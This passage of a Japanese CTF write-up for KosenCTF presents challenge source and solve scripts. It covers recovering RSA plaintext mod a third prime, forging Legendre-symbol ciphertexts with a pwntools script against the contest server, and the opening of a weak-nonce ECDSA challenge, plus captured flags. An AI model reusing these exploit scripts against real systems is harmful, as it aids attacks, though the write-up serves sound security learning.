+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Password: &#34;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s2">&#34;send&#34;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># username: UnderUltimateUtterUranium</span>
+<span class="c1"># password: PonPonPainPanicParadigm</span>
+<span class="c1"># KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="crypto-201pts-ciphertexts-33-solved">[crypto: 201pts] ciphertexts (33 solved)</h1>
+<p>次のmulti-prime rsaのような暗号と，その出力結果が渡されました．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">gmpy2</span>
+<span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="n">flag</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+<span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
+<span class="n">n1</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+<span class="n">n2</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">*</span> <span class="n">r</span>
+
+<span class="n">e1</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
+<span class="n">e2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gmpy2</span><span class="o">.</span><span class="n">next_prime</span><span class="p">(</span><span class="n">e1</span><span class="p">))</span>
+
+<span class="n">m</span> <span class="o">=</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+<span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e1</span><span class="p">,</span> <span class="n">n1</span><span class="p">)</span>
+<span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e2</span><span class="p">,</span> <span class="n">n2</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;n1 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">n1</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;n2 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">n2</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;e1 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e1</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;e2 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">e2</span><span class="p">))</span>
+<span class="k">print</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;c1 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c1</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">&#34;c2 = {}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c2</span><span class="p">))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>フラグはそんなに長くないと思い$m &lt; r$と予想して，法rの下で複合してあげたらフラグがでました．rの値は$n_2$を$n_1$で割ってあげれば出ます．
+そるばどぺー</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">from Crypto.Util.number import *
+
+n1 = 112027309284322736696115076630869358886830492611271994068413296220031576824816689091198353617581184917157891542298780983841631012944437383240190256425846911754031739579394796766027697768621362079507428010157604918397365947923851153697186775709920404789709337797321337456802732146832010787682176518192133746223
+n2 = 1473529742325407185540416487537612465189869383161838138383863033575293817135218553055973325857269118219041602971813973919025686562460789946104526983373925508272707933534592189732683735440805478222783605568274241084963090744480360993656587771778757461612919160894779254758334452854066521288673310419198851991819627662981573667076225459404009857983025927477176966111790347594575351184875653395185719233949213450894170078845932168528522589013379762955294754168074749
+r = n2 // n1
+e1 = 745699
+e2 = 745709
+
+c1 = 23144512980313393199971544624329972186721085732480740903664101556117858633662296801717263237129746648060819811930636439097159566583505473503864453388951643914137969553861677535238877960113785606971825385842502989341317320369632728661117044930921328060672528860828028757389655254527181940980759142590884230818
+c2 = 546013011162734662559915184213713993843903501723233626580722400821009012692777901667117697074744918447814864397339744069644165515483680946835825703647523401795417620543127115324648561766122111899196061720746026651004752859257192521244112089034703744265008136670806656381726132870556901919053331051306216646512080226785745719900361548565919274291246327457874683359783654084480603820243148644175296922326518199664119806889995281514238365234514624096689374009704546
+
+dr = inverse_mod(e2, r - 1)
+m = pow(c2 % r, dr, r)
+print(m)
+
+print(long_to_bytes(m))
+# KosenCTF{HALDYN_D0M3}
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="crypto-326pts-bitcrypto-17-solved">[crypto: 326pts] bitcrypto (17 solved)</h1>
+<p>&ldquo;&ldquo;&ldquo;hi!!!! flag!!!! here!!! wowowowowo~~~~~~&rdquo;&rdquo;&rdquo; ← これ好き</p>
+<p>次のコードが動いているサーバーに接続してフラグを取る問題です．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span>
+
+<span class="k">def</span> <span class="nf">legendre_symbol</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">p</span><span class="p">):</span>
+    <span class="n">a</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+    <span class="k">elif</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
+
+<span class="k">def</span> <span class="nf">key_gen</span><span class="p">(</span><span class="n">bits</span><span class="p">):</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+    <span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span>
+
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">z</span> <span class="o">=</span> <span class="n">getRandomRange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+        <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">legendre_symbol</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="n">p</span><span class="p">),</span> <span class="n">legendre_symbol</span><span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">b</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
+            <span class="k">break</span>
+
+    <span class="k">return</span> <span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">z</span><span class="p">),</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">enc</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
+    <span class="n">n</span><span class="p">,</span> <span class="n">z</span> <span class="o">=</span> <span class="n">pubkey</span>
+    <span class="n">bits</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="s2">&#34;{:b}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">)]</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">bits</span><span class="p">:</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">getRandomRange</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">GCD</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                <span class="k">break</span>
+        <span class="n">c</span><span class="o">.</span><span class="n">append</span><span class="p">(</span> <span class="p">((</span><span class="n">z</span><span class="o">**</span><span class="n">b</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="p">))</span> <span class="o">%</span> <span class="n">n</span> <span class="p">)</span>
+    <span class="k">return</span> <span class="n">c</span>
+
+<span class="k">def</span> <span class="nf">dec</span><span class="p">(</span><span class="n">privkey</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="n">privkey</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">legendre_symbol</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">legendre_symbol</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">m</span> <span class="o">+=</span> <span class="s2">&#34;0&#34;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">m</span> <span class="o">+=</span> <span class="s2">&#34;1&#34;</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">keyword</span> <span class="o">=</span> <span class="s2">&#34;yoshiking, give me ur flag&#34;</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;your query: &#34;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">any</span><span class="p">([</span><span class="n">c</span> <span class="ow">in</span> <span class="n">keyword</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">m</span><span class="p">]):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: forbidden!&#34;</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">m</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">8</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: too long!&#34;</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="n">enc</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">bytes_to_long</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;token to order yoshiking: &#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&#34;your token: &#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">)]</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">c</span><span class="p">)):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: invalid!&#34;</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="nb">any</span><span class="p">([</span><span class="n">x</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">c</span><span class="p">]):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: wow good unintended-solution!&#34;</span><span class="p">)</span>
+        <span class="nb">exit</span><span class="p">()</span>
+
+    <span class="n">m</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="n">dec</span><span class="p">(</span><span class="n">privkey</span><span class="p">,</span> <span class="n">c</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">m</span> <span class="o">==</span> <span class="n">keyword</span><span class="o">.</span><span class="n">encode</span><span class="p">():</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: hi!!!! flag!!!! here!!! wowowowowo~~~~~~&#34;</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&#34;yoshiking: ...?&#34;</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>ルジャンドル記号を利用した暗号に一つだけ平文を送ることができ，その暗号文を入手することができます．その後，複合した結果がkeywordの内容になるような暗号文を送って，それが正しければフラグがもらえるという内容です．
+コードを読むと，暗号文は整数のリストで，各数値がその位置のビットの暗号文となっていることがわかります．わた複合処理を読むと，$p,q$の下でビットのフラグが平方剰余なら$0$に，そうでないなら$1$に複合されるようです．</p>
+<p>yoshikingさんにinvalidと言われないようにしながら，keywordをビット列に直したものの分の$0$と$1$を作ることができれば解くことができます．また，一度嵌ったのですがあまりに送信する文字列が長いと途中で区切られてしまい，your tokenで暗号文を送り切ることができなくなります．そのためできるだけ小さい数字を使う必要もあります．</p>
+<p>複合したら$0$のビットになるような小さい数を作るのは簡単です．平方剰余，つまり平方根が存在してればいいため適当な平方数は全て$0$に複合されます．</p>
+<p>次に，複合したら$1$になる数について考えます．これはルジャンドル記号が準同型であるのを利用すればよく，具体的には$$\left(\frac{ab}{p}\right) = \left(\frac{a}{p}\right) \left(\frac{b}{p}\right)$$が成り立ちます．つまり，ルジャンドル記号が$-1$になるような数を一つ見つけることができれば，それに平方数をかけていくことで，次々に重複のない$1$に複合される数を作り出すことができます．それを並び替えてkeywordのビット列にすればフラグを入手することができます．</p>
+<p>そるばどぺー</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+
+
+<span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;111100101101111011100110110100001101001011010110110100101101110011001110010110000100000011001110110100101110110011001010010000001101101011001010010000001110101011100100010000001100110011011000110000101100111&#34;</span>
+  
+<span class="n">test</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span> <span class="o">*</span> <span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;0&#34;</span> <span class="o">*</span> <span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">))</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;crypto.kosenctf.com&#34;</span><span class="p">,</span> <span class="mi">13003</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x02</span><span class="s2">&#34;</span><span class="p">)</span>
+
+<span class="n">zeros</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;0&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">zeros</span> <span class="o">+=</span> <span class="p">[</span><span class="n">i</span> <span class="o">**</span> <span class="mi">2</span><span class="p">]</span>
+
+<span class="n">ones</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">target</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">):</span>
+    <span class="n">ones</span> <span class="o">+=</span> <span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">**</span> <span class="mi">2</span><span class="p">)]</span>
+
+<span class="n">solve</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">target</span><span class="p">:</span>
+    <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="s2">&#34;1&#34;</span><span class="p">:</span>
+        <span class="n">solve</span> <span class="o">+=</span> <span class="p">[</span><span class="n">ones</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
+        <span class="n">ones</span> <span class="o">=</span> <span class="n">ones</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">solve</span> <span class="o">+=</span> <span class="p">[</span><span class="n">zeros</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span>
+        <span class="n">zeros</span> <span class="o">=</span> <span class="n">zeros</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">solve</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">))</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="c1"># KosenCTF{yoshiking_is_clever_and_wild_god_of_crypt}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h1 id="crypto-383pts-ochazuke-11-solved">[crypto: 383pts] ochazuke (11 solved)</h1>
+<p>次のsageのコードが動いているサーバーにアクセスできます．</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">from Crypto.Util.number import bytes_to_long
+from binascii import unhexlify
+from hashlib import sha1
+import re
+
+EC = EllipticCurve(
+    GF(0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff),
+    [-3, 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b]
+)
+n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 # EC.order()
+Zn = Zmod(n)
+G = EC((0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
+        0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5))
+
+def sign(private_key, message):
+    z = Zn(bytes_to_long(message))
+    k = Zn(ZZ(sha1(message).hexdigest(), 16)) * private_key
+    assert k != 0
+    K = ZZ(k) * G
+    r = Zn(K[0])
+    assert r != 0
+    s = (z + r * private_key) / k
+    assert s != 0
+    return (r, s)
+
+def verify(public_key, message, signature):
+    r, s = signature[0], signature[1]
+    if r == 0 or s == 0:
+        return False
+    z = Zn(bytes_to_long(message))
+    u1, u2 = z / s, r / s
+    K = ZZ(u1) * G + ZZ(u2) * public_key
+    if K == 0:
+        return False
+    return Zn(K[0]) == r
+
+if __name__==&#34;__main__&#34;:
+    from secret import flag, d
+    public_key = ZZ(d) * G
+    print(&#34;public key:&#34;, public_key)
+    
+    your_msg = unhexlify(input(&#34;your message(hex): &#34;))
+    if len(your_msg) &lt; 10 or b&#34;ochazuke&#34; in your_msg:
+        print(&#34;byebye&#34;)
+        exit()
+    your_sig = sign(d, your_msg)
+    print(&#34;your signature:&#34;, your_sig)
+
+    sig = input(&#34;please give me ochazuke&#39;s signature: &#34;)
+    r, s = map(Zn, re.compile(&#34;\((\d+), (\d+)\)&#34;).findall(sig)[0])
+    if verify(public_key, b&#34;ochazuke&#34;, (r, s)):
+        print(&#34;thx!&#34;, flag)
+    else:
+        print(&#34;it&#39;s not ochazuke :(&#34;)
+</code></pre></td></tr></table>
+</div>
+</div><p>楕円曲線を利用したシグネチャの処理を行っていて，最初に公開鍵が与えられます．その後適当な(hexlifyした)文字列のシグネチャを計算してくれます．最後にその公開鍵での&quot;ochazuke&quot;のシグネチャを検証し，それが通ればフラグが手に入ります．</p>
